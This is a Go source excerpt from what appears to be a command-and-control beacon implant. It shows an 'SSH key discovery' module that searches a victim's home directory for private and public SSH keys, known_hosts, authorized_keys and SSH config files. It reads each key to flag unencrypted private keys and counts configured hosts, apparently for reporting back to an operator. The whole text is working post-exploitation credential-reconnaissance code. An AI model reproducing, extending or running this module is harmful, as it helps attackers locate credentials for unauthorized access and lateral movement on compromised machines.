// SSH Key Discovery module - Find SSH keys and configurations

func (b *GoBeacon) moduleSSHKeyDiscovery(parameters string) string {
	var result strings.Builder
	result.WriteString("=== SSH KEY DISCOVERY ===\n")

	sshPaths := b.getSSHPaths()
	found := 0

	for keyType, paths := range sshPaths {
		result.WriteString(fmt.Sprintf("\n--- %s ---\n", keyType))

		for _, path := range paths {
			if info, err := os.Stat(path); err == nil {
				result.WriteString(fmt.Sprintf("Found: %s\n", path))
				result.WriteString(fmt.Sprintf("  Size: %d bytes\n", info.Size()))
				result.WriteString(fmt.Sprintf("  Mode: %s\n", info.Mode()))
				result.WriteString(fmt.Sprintf("  Modified: %s\n", info.ModTime().Format("2006-01-02 15:04:05")))

				// Check if it's encrypted
				if data, err := ioutil.ReadFile(path); err == nil && len(data) > 0 {
					if strings.Contains(string(data), "ENCRYPTED") {
						result.WriteString("  Status: Encrypted (passphrase required)\n")
					} else if strings.Contains(string(data), "PRIVATE KEY") {
						result.WriteString("  Status: Unencrypted private key\n")
					} else if strings.Contains(string(data), "PUBLIC KEY") {
						result.WriteString("  Status: Public key\n")
					}
				}
				found++
			}
		}
	}

	// Check for SSH config
	configPaths := []string{
		filepath.Join(os.Getenv("HOME"), ".ssh", "config"),
		filepath.Join(os.Getenv("USERPROFILE"), ".ssh", "config"),
	}

	for _, configPath := range configPaths {
		if _, err := os.Stat(configPath); err == nil {
			result.WriteString(fmt.Sprintf("\nSSH Config found: %s\n", configPath))
			if data, err := ioutil.ReadFile(configPath); err == nil {
				lines := strings.Split(string(data), "\n")
				hostCount := 0
				for _, line := range lines {
					if strings.HasPrefix(strings.TrimSpace(line), "Host ") {
						hostCount++
					}
				}
				result.WriteString(fmt.Sprintf("  Configured hosts: %d\n", hostCount))
			}
		}
	}

	result.WriteString(fmt.Sprintf("\nTotal SSH keys found: %d\n", found))

	return result.String()
}

func (b *GoBeacon) getSSHPaths() map[string][]string {
	sshKeys := make(map[string][]string)

	var sshDir string
	if runtime.GOOS == "windows" {
		sshDir = filepath.Join(os.Getenv("USERPROFILE"), ".ssh")
	} else {
		sshDir = filepath.Join(os.Getenv("HOME"), ".ssh")
	}

	sshKeys["Private Keys"] = []string{
		filepath.Join(sshDir, "id_rsa"),
		filepath.Join(sshDir, "id_dsa"),
		filepath.Join(sshDir, "id_ecdsa"),
		filepath.Join(sshDir, "id_ed25519"),
		filepath.Join(sshDir, "identity"),
	}

	sshKeys["Public Keys"] = []string{
		filepath.Join(sshDir, "id_rsa.pub"),
		filepath.Join(sshDir, "id_dsa.pub"),
		filepath.Join(sshDir, "id_ecdsa.pub"),
		filepath.Join(sshDir, "id_ed25519.pub"),
		filepath.Join(sshDir, "identity.pub"),
	}

	sshKeys["Known Hosts"] = []string{
		filepath.Join(sshDir, "known_hosts"),
		filepath.Join(sshDir, "authorized_keys"),
	}

	return sshKeys
}
